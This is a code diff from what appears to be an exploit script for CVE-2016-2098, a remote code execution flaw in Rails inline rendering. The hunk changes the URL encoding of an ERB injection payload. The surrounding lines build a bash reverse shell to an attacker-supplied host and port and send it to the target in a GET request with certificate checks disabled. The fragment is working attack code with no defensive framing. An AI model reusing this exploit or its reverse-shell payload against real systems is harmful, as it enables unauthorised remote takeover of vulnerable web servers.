@@ -20,7 +20,7 @@ class CVE2016_2098:
     def exploit(self):
         print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
         cmd = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.host, self.port)
-        payload = "[inline]=" + "<%25=" + "%25x" + "('" + cmd + "')" + "%25>"
+        payload = "[inline]=" + "%3C%25=%20%25x(" + cmd + ")%20%25%3E"
         url = self.url + '/' + self.path + payload
         print (LogColors.YELLOW + url + LogColors.ENDC)
         r = self.session.get(url, verify = False)
